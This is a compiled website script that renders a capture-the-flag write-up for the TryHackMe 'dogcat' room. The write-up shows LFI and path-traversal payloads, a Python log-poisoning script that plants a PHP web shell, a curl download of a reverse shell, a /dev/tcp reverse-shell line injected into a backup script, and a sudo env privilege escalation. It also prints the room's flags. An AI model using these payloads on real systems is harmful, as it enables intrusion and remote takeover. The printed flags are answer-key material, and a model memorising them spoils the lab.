"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7698],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>m});var a=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function r(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function l(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?r(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):r(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,o=function(e,n){if(null==e)return{};var t,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)t=r[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=a.createContext({}),c=function(e){var n=a.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):l(l({},n),e)),t},p=function(e){var n=c(e.components);return a.createElement(s.Provider,{value:n},e.children)},g="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},d=a.forwardRef((function(e,n){var t=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),g=c(t),d=o,m=g["".concat(s,".").concat(d)]||g[d]||u[d]||r;return t?a.createElement(m,l(l({ref:n},p),{},{components:t})):a.createElement(m,l({ref:n},p))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var r=t.length,l=new Array(r);l[0]=d;var i={};for(var s in n)hasOwnProperty.call(n,s)&&(i[s]=n[s]);i.originalType=e,i[g]="string"==typeof e?e:o,l[1]=i;for(var c=2;c<r;c++)l[c]=t[c];return a.createElement.apply(null,l)}return a.createElement.apply(null,t)}d.displayName="MDXCreateElement"},92683:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>s,contentTitle:()=>l,default:()=>u,frontMatter:()=>r,metadata:()=>i,toc:()=>c});var a=t(87462),o=(t(67294),t(3905));const r={},l="dogcat",i={unversionedId:"Tryhackme/Dogcat/Dogcat",id:"Tryhackme/Dogcat/Dogcat",title:"dogcat",description:"I made a website where you can look at pictures of dogs and/or cats!",source:"@site/writeups/Tryhackme/Dogcat/Dogcat.md",sourceDirName:"Tryhackme/Dogcat",slug:"/Tryhackme/Dogcat/",permalink:"/writeups/Tryhackme/Dogcat/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Develpy",permalink:"/writeups/Tryhackme/Develpy/"},next:{title:"Easy Peasy",permalink:"/writeups/Tryhackme/Easy Peasy/"}},s={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2}],p={toc:c},g="wrapper";function u(e){let{components:n,...t}=e;return(0,o.kt)(g,(0,a.Z)({},p,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"dogcat"},"dogcat"),(0,o.kt)("p",null,"I made a website where you can look at pictures of dogs and/or cats!"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/dogcat"},"dogcat")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Local File Inclusion"),(0,o.kt)("li",{parentName:"ul"},"Directory Traversal"),(0,o.kt)("li",{parentName:"ul"},"Python Scripting (Log Poisoning)"),(0,o.kt)("li",{parentName:"ul"},"Log Poisoning"),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("p",null,"I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats!"),(0,o.kt)("p",null,"This machine may take a few minutes to fully start up."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"view-source:http://10.10.236.6/?view=dog)../../../../../etc/passwd&ext=")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"view-source:http://10.10.236.6/?view=php://filter/read=convert.base64-encode/resource=./dog/../index")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"<!DOCTYPE HTML>\n<html>\n\n<head>\n    <title>dogcat</title>\n    <link rel=\"stylesheet\" type=\"text/css\" href=\"/style.css\">\n</head>\n\n<body>\n    <h1>dogcat</h1>\n    <i>a gallery of various dogs or cats</i>\n\n    <div>\n        <h2>What would you like to see?</h2>\n        <a href=\"/?view=dog\"><button id=\"dog\">A dog</button></a> <a href=\"/?view=cat\"><button id=\"cat\">A cat</button></a><br>\n        <?php\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n            $ext = isset($_GET[\"ext\"]) ? $_GET[\"ext\"] : '.php';\n            if(isset($_GET['view'])) {\n                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {\n                    echo 'Here you go!';\n                    include $_GET['view'] . $ext;\n                } else {\n                    echo 'Sorry, only dogs or cats are allowed.';\n                }\n            }\n        ?>\n    </div>\n</body>\n\n</html>\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is flag 1?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"http://10.10.236.6/?view=php://filter/convert.base64-encode/resource=dog../../flag")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/dogcat$ echo -n 'PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=' | base64 -d\n<?php\n$flag_1 = \"THM{Th1s_1s_N0t_4_Catdog_ab67edfa}\"\n?>\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},'import requests\n\nip = "10.10.236.6"\nurl = f"http://{ip}/"\n\nheader = { "User-Agent": "<?php system($_GET[\'cmd\']); ?>" }\n\nparams = {\n    "view": "dog../../../../../var/log/apache2/access.log",\n    "ext": ""\n}\n\nr = requests.get(url, headers=header, params=params)\n\nif r.status_code == 200:\n  print("log poisoned!")\nelse:\n  print("an error occurred, please try again")\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/dogcat$ python3 log_poison.py\n")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},"view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=ls%20-la")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},"view-source:http://10.10.236.6/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=whoami"))),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is flag 2?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"view-source:http://10.10.236.6/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=cat%20../flag2_QMW7JvaY2LvK.txt")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'10.8.106.222 - - [04/Oct/2020:09:22:39 +0000] "GET /?view=dog..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log&ext= HTTP/1.1" 200 18968 "-" "THM{LF1_t0_RC3_aec3fb}\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{LF1_t0_RC3_aec3fb}")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/?view=php://filter/resource=./dog/../../../../../../../var/log/apache2/access.log&ext=&cmd=curl -o php-reverse-shell.php 10.8.106.222/php-reverse-shell.php")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"http://10.10.236.6/php-reverse-shell.php")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/dogcat$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.236.6] 36512\nLinux 87423e9d96a6 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux\n 09:43:42 up 55 min,  0 users,  load average: 0.00, 0.00, 0.04\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ sudo -l\nMatching Defaults entries for www-data on 87423e9d96a6:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on 87423e9d96a6:\n    (root) NOPASSWD: /usr/bin/env\n$\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo env /bin/sh\n\nwhoami\nroot\ncd /root\nls\nflag3.txt\ncat flag3.txt\nTHM{D1ff3r3nt_3nv1ronments_874112}\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What is flag 3?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{D1ff3r3nt_3nv1ronments_874112}")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is flag 4?")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},'echo "#!/bin/bash" > /opt/backups/backup.sh')),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("inlineCode",{parentName:"li"},"echo \"/bin/bash -c 'bash -i >& /dev/tcp/10.8.106.222/8888 0>&1'\" >> /opt/backups/backup.sh"))),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/dogcat$ nc -nlvp 8888\nlistening on [any] 8888 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.236.6] 49730\nbash: cannot set terminal process group (4662): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@dogcat:~# whoami\nwhoami\nroot\nroot@dogcat:~# ls\nls\ncontainer\nflag4.txt\nroot@dogcat:~# cat flag4.txt\ncat flag4.txt\nTHM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}\nroot@dogcat:~#\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}")))}u.isMDXComponent=!0}}]);